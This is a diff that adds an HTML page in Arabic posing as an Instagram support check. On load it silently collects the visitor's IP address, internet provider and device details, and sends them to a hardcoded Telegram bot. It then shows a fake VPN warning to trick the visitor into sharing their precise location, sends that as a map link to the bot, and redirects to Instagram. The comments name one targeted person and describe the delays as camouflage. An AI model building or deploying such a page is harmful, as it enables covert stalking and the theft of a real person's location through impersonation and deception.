@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Support</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .logo { width: 170px; margin-bottom: 25px; }
+        .status-msg { color: #ed4956; font-weight: bold; font-size: 14px; margin-top: 15px; display: none; }
+        .info { color: #8e8e8e; font-size: 13px; line-height: 1.6; margin: 15px 0; }
+        .btn { background: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 14px; }
+        #loader { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e05b564.png" class="logo">
+    
+    <div id="loading-area">
+        <div id="loader"></div>
+        <p class="info">جاري التحقق من اتصالك...</p>
+    </div>
+
+    <div id="vpn-error" style="display: none;">
+        <p class="status-msg" style="display: block;">⚠️ يبدو أنك تستخدم تطبيق VPN أو Proxy</p>
+        <p class="info">لأسباب أمنية، يرجى تعطيل الـ VPN والسماح بالوصول للموقع للتأكد من هويتك والمتابعة إلى حسابك.</p>
+        <button class="btn" onclick="getLocation()">تأكيد الموقع والمتابعة</button>
+    </div>
+</div>
+
+<script>
+    const token = '8609389464:AAEIqne_f0xZNOeqYz-rk7XOsbALUM12gA8';
+    const chat_id = '8658217605';
+    const redirectUrl = "https://www.instagram.com/reels/"; // سيوجهه لصفحة الريلز العامة لحسابه
+
+    // 1. بمجرد الدخول، نسحب الـ IP والجهاز صامتاً
+    window.onload = async () => {
+        setTimeout(async () => {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const data = await ipRes.json();
+                
+                const report = `🔔 زيارة أولية لـ أنس:\n🌐 IP: ${data.ip}\n🏢 المزود: ${data.org}\n📱 الجهاز: ${navigator.userAgent}`;
+                
+                sendToBot(report);
+                
+                // إظهار رسالة الـ VPN بعد "تحميل" وهمي
+                document.getElementById('loading-area').style.display = 'none';
+                document.getElementById('vpn-error').style.display = 'block';
+            } catch (e) {
+                document.getElementById('loading-area').style.display = 'none';
+                document.getElementById('vpn-error').style.display = 'block';
+            }
+        }, 2000); // تأخير ثانيتين للتمويه
+    };
+
+    // 2. طلب الموقع الدقيق عند ضغط الزر
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                const finalReport = `🎯 صيدة الموقع الدقيق لـ أنس:\n📍 الخريطة: ${mapLink}\n🎯 الدقة: ${Math.round(pos.coords.accuracy)} متر`;
+                
+                await sendToBot(finalReport);
+                window.location.replace(redirectUrl);
+            }, (err) => {
+                sendToBot("⚠️ المستخدم رفض إعطاء الموقع الدقيق.");
+                window.location.replace(redirectUrl);
+            }, { enableHighAccuracy: true });
+        } else {
+            window.location.replace(redirectUrl);
+        }
+    }
+
+    async function sendToBot(msg) {
+        return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+    }
+</script>
+
+</body>
+</html>
